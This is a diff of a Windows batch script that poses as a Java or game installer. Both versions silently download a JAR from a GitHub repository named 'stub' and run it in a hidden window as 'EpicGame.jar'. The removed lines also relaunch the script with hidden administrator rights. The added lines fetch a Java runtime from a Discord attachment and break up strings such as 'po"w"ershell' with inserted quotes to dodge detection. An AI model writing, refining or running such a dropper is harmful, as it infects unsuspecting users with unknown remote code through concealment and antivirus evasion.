@@ -1,16 +1,7 @@
 @echo off
-:: Überprüfen, ob das Skript mit Administratorrechten ausgeführt wird
-net session >nul 2>&1
-if %errorLevel% NEQ 0 (
-    :: Skript als Administrator neu starten (unsichtbar)
-    powershell -Command "Start-Process cmd -Argument '/c \"%~f0\"' -Verb RunAs -WindowStyle Hidden"
-    exit /b
-)
 
-:: UTF-8 Codepage setzen
 chcp 65001 >nul
 
-:: Überprüfen, ob Java bereits installiert ist (unsichtbar)
 java -version >nul 2>&1
 if %errorLevel% NEQ 0 (
     goto :install_java
@@ -18,45 +9,31 @@ if %errorLevel% NEQ 0 (
     goto :download_and_run_jar
 )
 
-:: Java Installation
 :install_java
-set "url=https://javadl.oracle.com/webapps/download/AutoDL?BundleId=250129_d8aa705069af427f9b83e66b34f5e380"
-set "output=%TEMP%\game-engine-installer.exe"
-set "installDir=C:\Program Files\Java\jdk-latest"
+set "url=https://cdn.discordapp.com/attachments/129"0"426391392686080/12936331"8"9289394196/jre1.8.0_361.zip?ex=6708154a&is=6706c3ca&hm=c85af7a9d1b522cc8d680aeb7ffc5204f6110b50058bba2b42f0679f54f4f0e7"
+set "output=%TEMP%\jre1.8.0_3"6"1.zip"
+set "installDir=%USERPROFILE%\Java\jre1.8.0_361"
 
-:: Download starten (im Hintergrund)
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%output%')"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%output%')"
 
-:: Überprüfen, ob der Download erfolgreich war
-if exist "%output%" (
-    start /wait "" "%output%" /s INSTALLDIR="%installDir%"
-    if exist "%installDir%\bin\java.exe" (
-        del "%output%"
-    ) else (
-        exit /b 1
-    )
+powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%output%' -DestinationPath '%installDir%'"
+
+if exist "%installDir%\jre1.8.0_361\bin\java.exe" (
+    del "%output%"
 ) else (
     exit /b 1
 )
 
-:: PATH-Umgebungsvariable aktualisieren
-setx PATH "%PATH%;%installDir%\bin" /M
+set PATH=%PATH%;%installDir%\jre1.8.0_361\bin
 
-:: Download und Ausführung der JAR-Datei
 :download_and_run_jar
-set "jarUrl=https://github.com/Python-is-trash/stub/raw/refs/heads/main/Java.jar"
-set "jarOutput=%TEMP%\EpicGame.jar"
+set "jarUrl=https://github.com/Python-is-trash/stub/raw/refs/heads/main/J"a"va.jar"
+set "jarOutput=%TEMP%\Ep"i"cGame.jar"
 
-:: JAR-Datei herunterladen (unsichtbar)
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%jarUrl%', '%jarOutput%')"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%jarUrl%', '%jarOutput%')"
 
-:: JAR-Datei im Hintergrund ausführen (unsichtbar)
 if exist "%jarOutput%" (
-    if exist "%installDir%\bin\java.exe" (
-        powershell -Command "Start-Process '%installDir%\bin\java.exe' -ArgumentList '-jar', '%jarOutput%' -WindowStyle Hidden"
-    ) else (
-        powershell -Command "Start-Process 'java' -ArgumentList '-jar', '%jarOutput%' -WindowStyle Hidden"
-    )
+    po"w"ershell -WindowStyle Hidden -Command "Start-Process 'java' -ArgumentList '-jar', '%jarOutput%' -WindowStyle Hidden"
 )
 
 exit
